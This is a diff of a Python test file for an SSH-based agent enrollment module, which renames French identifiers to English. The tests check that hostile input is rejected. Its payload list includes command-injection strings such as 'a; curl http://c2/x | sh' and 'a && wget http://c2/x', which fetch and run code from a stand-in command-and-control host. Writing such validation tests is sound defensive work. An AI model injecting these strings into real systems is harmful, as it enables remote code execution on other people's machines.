@@ -17,11 +17,11 @@ passée après l'appel — ce qui est précisément le défaut à empêcher.
 
 import pytest
 
-from aura_mcp import enrolement
-from aura_mcp.enrolement import ErreurEnrolement
+from aura_mcp import enrollment
+from aura_mcp.enrollment import EnrollmentError
 
 
-CHARGES = [
+LOADED = [
     "a; curl http://c2/x | sh",
     "a && wget http://c2/x",
     "a`id`",
@@ -35,65 +35,65 @@ CHARGES = [
 
 # `nom_agent` vide n'est pas une charge : c'est la valeur par défaut documentée
 # de l'outil, qui retombe alors sur le nom d'hôte.
-CHARGES_VIDE = CHARGES + [""]
+LOADED_EMPTY = LOADED + [""]
 
 
-@pytest.mark.parametrize("charge", CHARGES)
+@pytest.mark.parametrize("charge", LOADED)
 def test_nom_agent_hostile_refuse_linux(charge):
-    with pytest.raises(ErreurEnrolement, match="nom_agent refusé"):
-        enrolement.enroler_linux("192.168.10.12", charge, "root", "192.168.10.5")
+    with pytest.raises(EnrollmentError, match="nom_agent refusé"):
+        enrollment.enroll_linux("192.168.10.12", charge, "root", "192.168.10.5")
 
 
-@pytest.mark.parametrize("charge", CHARGES)
+@pytest.mark.parametrize("charge", LOADED)
 def test_nom_agent_hostile_refuse_windows(charge):
-    with pytest.raises(ErreurEnrolement, match="nom_agent refusé"):
-        enrolement.enroler_windows("192.168.10.20", charge, "adm", "mdp",
+    with pytest.raises(EnrollmentError, match="nom_agent refusé"):
+        enrollment.enroll_windows("192.168.10.20", charge, "adm", "mdp",
                                    "192.168.10.5")
 
 
-@pytest.mark.parametrize("charge", CHARGES_VIDE)
+@pytest.mark.parametrize("charge", LOADED_EMPTY)
 def test_manager_hostile_refuse(charge):
-    with pytest.raises(ErreurEnrolement, match="manager refusé"):
-        enrolement.enroler_linux("192.168.10.12", "srv-web", "root", charge)
+    with pytest.raises(EnrollmentError, match="manager refusé"):
+        enrollment.enroll_linux("192.168.10.12", "srv-web", "root", charge)
 
 
 @pytest.mark.parametrize("charge", ["ro ot; id", "root|id", "-x", "", "a" * 40])
 def test_ssh_user_hostile_refuse(charge):
-    with pytest.raises(ErreurEnrolement, match="ssh_user refusé"):
-        enrolement.enroler_linux("192.168.10.12", "srv-web", charge,
+    with pytest.raises(EnrollmentError, match="ssh_user refusé"):
+        enrollment.enroll_linux("192.168.10.12", "srv-web", charge,
                                  "192.168.10.5")
 
 
-@pytest.mark.parametrize("charge", CHARGES_VIDE)
+@pytest.mark.parametrize("charge", LOADED_EMPTY)
 def test_hote_hostile_refuse(charge):
-    with pytest.raises(ErreurEnrolement, match="hote refusé"):
-        enrolement.enroler_linux(charge, "srv-web", "root", "192.168.10.5")
+    with pytest.raises(EnrollmentError, match="hote refusé"):
+        enrollment.enroll_linux(charge, "srv-web", "root", "192.168.10.5")
 
 
 def test_assurer_identite_valide_aussi():
     """Appelable directement, et construit elle aussi une commande distante."""
-    with pytest.raises(ErreurEnrolement, match="nom_agent refusé"):
-        enrolement.assurer_identite("192.168.10.12", "root", "a; id",
+    with pytest.raises(EnrollmentError, match="nom_agent refusé"):
+        enrollment.ensure_identity("192.168.10.12", "root", "a; id",
                                     "192.168.10.5")
 
 
 def test_verifier_linux_valide_ses_entrees():
     """Atteignable en `aura:read` via aura_agent_health."""
-    with pytest.raises(ErreurEnrolement, match="hote refusé"):
-        enrolement.verifier_linux("h; id", "root")
+    with pytest.raises(EnrollmentError, match="hote refusé"):
+        enrollment.check_linux("h; id", "root")
 
 
 def test_valeurs_legitimes_passent_la_validation():
     """La validation ne doit pas rejeter ce que le parc contient réellement :
     IP, FQDN, nom d'agent avec tirets et points, adresse IPv6.
     """
-    from aura_mcp.enrolement import (_RE_HOTE, _RE_NOM_AGENT, _RE_UTILISATEUR,
-                                     _valider)
+    from aura_mcp.enrollment import (_RE_HOST, _RE_AGENT_NAME, _RE_USER,
+                                     _validate)
 
-    for hote in ("192.168.10.12", "srv-web.lab", "win-dc.lab.local",
+    for host in ("192.168.10.12", "srv-web.lab", "win-dc.lab.local",
                  "fe80::1", "adguard"):
-        assert _valider(hote, _RE_HOTE, "hote", "x") == hote
-    for nom in ("srv-web-01", "WIN-DC", "jellyfin", "pve.node1", "002"):
-        assert _valider(nom, _RE_NOM_AGENT, "nom_agent", "x") == nom
+        assert _validate(host, _RE_HOST, "hote", "x") == host
+    for name in ("srv-web-01", "WIN-DC", "jellyfin", "pve.node1", "002"):
+        assert _validate(name, _RE_AGENT_NAME, "nom_agent", "x") == name
     for user in ("root", "wazuh-admin", "_svc", "debian"):
-        assert _valider(user, _RE_UTILISATEUR, "ssh_user", "x") == user
+        assert _validate(user, _RE_USER, "ssh_user", "x") == user
